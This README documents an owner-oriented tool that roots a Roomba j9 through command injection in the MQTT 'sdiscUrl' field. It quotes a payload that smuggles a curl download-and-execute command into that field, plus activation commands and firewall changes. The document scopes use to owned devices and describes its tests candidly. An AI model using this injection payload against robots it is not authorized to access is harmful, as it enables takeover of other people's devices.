# roomba::unjailed — runtime SSH workflow

This host workflow follows the owner's successful **30 October 2026 handoff**:
Roomba j9/j9+, SKU j915840, firmware
`ruby+24.29.1-2024-08-01-9510a0d1e65+Release+54`.
The handoff reports root execution, an `SSH-2.0-OpenSSH_8.2` banner and an SSH
login. This repository correction has been exercised **offline**, not freshly on
that robot. Other firmware/models are not established by these tests.

Use only on an owned/authorized robot, from a trusted LAN. Root SSH access changes
the device's security boundary. Do not expose it to the Internet. The existing
MQTT TLS configuration disables certificate verification for the expired device
certificate; it does not authenticate the broker's identity.

## Run from the host

Requires Python 3.10+, Bash and the dependencies in `requirements.txt`:

```sh
python3 -m venv .venv
.venv/bin/python -m pip install -r runjailed/requirements.txt
export PYTHON="$PWD/.venv/bin/python"

# Network-free payload check: no credentials, DNS, listener or MQTT publish.
./runjailed/oneclick-ssh.sh 192.0.2.1 --host-ip 192.0.2.2 --dry-run

# Actual activation — substitute the real robot and this host's LAN addresses.
# Enter credentials interactively, or provide ROOMBA_BLID/ROOMBA_PASSWORD via
# your authorized environment. Never retrieve them from old logs or histories.
./runjailed/oneclick-ssh.sh ROBOT_IPV4 --host-ip HOST_IPV4 --timeout 120
```

The default host address is the OS route's source address toward the robot, not
an Internet probe. `--host-ip` must name an interface on this computer. Live mode
also accepts a valid hostname resolving to exactly one IPv4 address; resolution
has a five-second deadline and only the resulting literal enters the payload and
firewall rules. Dry-run requires a literal host IPv4 and does no DNS resolution.
The robot address must always be a numeric IPv4.

A **single local HTTP listener on port 8883** serves both `enableSSH.sh` and
`sshd.socket` and receives the beacons. MQTT/TLS on **robot:8883** is on a different
host; it does not conflict with **host:8883 HTTP**. The handoff's packet trace
identified robot return-path filtering for host source port 8899; 8883 worked.
A host self-probe is not evidence of reachability from the robot.

Options include `--blid`, `--password` (prefer prompt/environment to command-line
secrets), `--host-ip`, `--http-port` (8883), `--beacon-port` (legacy alias, must
match the shared HTTP port), `--ssh-port` (probe only, normally 22), `--timeout`
(120 seconds after local send), and `--dry-run`. The robot unit always listens on
22; changing the probe port does not reconfigure it. `--no-serve` is deliberately
unsupported: a separate file server cannot supply this attempt's integrated
observations. `--linger` applies only to manual `--send`, not SSH verification.
There is no production-server or host-firewall setup in these scripts.

Equivalent direct invocation:

```sh
"$PYTHON" runjailed/runjailed.py --ip ROBOT_IPV4 --enable-ssh HOST_IPV4
```

## Device contract and scope

- External topic **`wifictl`**, MQTT **3.1.1**, BLID as username **and client ID**,
  QoS **0**, retain **false**, JSON `{"state":{"sdiscUrl":"…"}}`.
  The handoff reports that `local_manager` unwraps `state` and forwards internally
  over `local/delta`. That internal name does not exclude external `wifictl`.
- The complete `sdiscUrl` field is limited to **191 UTF-8 bytes**. The bootstrap
  uses `/bin/busybox.suid su -c` and `/usr/bin/curl`, not `wget` or plain busybox.
  Example shape (addresses are validated numeric literals):

  ```text
  https://$(/bin/busybox.suid su -c '/usr/bin/curl -fsS -m15 -o /tmp/e http://HOST:8883/enableSSH.sh&&sh /tmp/e HOST 8883')
  ```

  The `&&` prevents executing an old `/tmp/e` if the download fails.
- `scripts/enableSSH.sh` rejects non-root execution and invalid callback/port
  arguments. It sends `/whoami/root`, downloads `sshd.socket` using bounded curl,
  copies the socket unit **only to `/run/systemd/system`**, reloads systemd and
  **starts**, rather than persistently enables, the unit. It relies on the
  firmware's existing SSH service implementation.
- Additional firewall ACCEPT rules are strictly INPUT `tcp --dport 22 -s HOST`
  and OUTPUT `tcp --sport 22 -d HOST`. Exact existing rules are checked first.
  No rules are flushed, deleted or broadly replaced. No provisioning,
  `SYSTEM_ACCESS`, firmware image or cloud-discovery configuration is modified.
  The socket override and added rules expire on robot reboot. Partial failures
  may leave these narrow runtime changes; there is no broad rollback/cleanup.
- Other historical scripts in this directory are **not** part of this supported
  workflow. Legacy chunking/root helpers remain explicit errors directing callers
  to `--enable-ssh`.

## What counts as success

Oneclick delegates the entire lifecycle to `runjailed.py`; it does not grep an
obsolete local-publish string or retry the payload. Exit codes:

| Code | Meaning |
|---|---|
| 0 | In SSH mode: requested bootstrap **and socket-unit downloads**, exact `/whoami/root`, exact `/done/ssh`, **and a complete SSH protocol banner** were observed. Dry-run 0 only validates the payload. |
| 1 | HTTP listener, connection, authentication, disconnect or local-send failure. |
| 2 | Invalid/missing arguments or credentials. |
| 3 | Local MQTT send completed, but device verification timed out; missing observations/banner are reported. |

Observations must come from the configured robot IP during this publish attempt;
other sources, pre-publish requests, substring matches and query-suffixed beacons
cannot establish success. This assumes a direct trusted LAN, not a NAT/relay that
changes the robot's source IP. HTTP beacons are **not authenticated attestations**.
The SSH banner is checked even if TCP/22 already accepts connections; a click,
MQTT return code, root beacon or open TCP port alone is insufficient. A verified
banner is still not proof of a successful SSH login; no login is attempted.

Paho retains the robust `loop_start()` single-writer lifecycle, waits for CONNACK,
and bounds each complete local send. TCP/TLS connect and CONNACK each have a
10-second limit; local publish has five seconds. Cleanup allows one second for
Paho before unblocking a stuck socket, stops the loop, and closes the HTTP server.
HTTP request workers are daemon threads with socket timeouts, so an incomplete
request does not hold up server shutdown. No reconnect or automatic republish is
performed. SSH probing alone is polled within `--timeout`.

Manual `--send URL` still returns 0 for a **local send only** and explicitly says
that device execution was not verified. With neither send nor SSH activation,
passive monitoring intentionally runs until disconnect/interruption.

## Offline verification

```sh
python -m pytest -q -W error
bash -n runjailed/oneclick-ssh.sh
sh -n runjailed/scripts/enableSSH.sh
git diff --check
```

Tests exercise the real CLI dry-run/error paths, actual localhost HTTP downloads
and beacon routing, complete/non-SSH/silent banner sockets, source/attempt
attribution, and real Paho serialization/network-loop behavior over a socketpair
(including forced short writes and bounded failures). Integrated host tests use a
**synthetic device boundary** to check verified exit 0 versus missing-root exit 3.
Robot shell tests use isolated command-recording fakes and temporary writable
paths: they never change the host's real firewall, services or provisioning.
These tests are **not firmware/hardware evidence**. The remaining live boundary
is one authorized run against the actual robot, observing its requested download,
root and done beacons and SSH banner; a fresh SSH login needs separate verification.
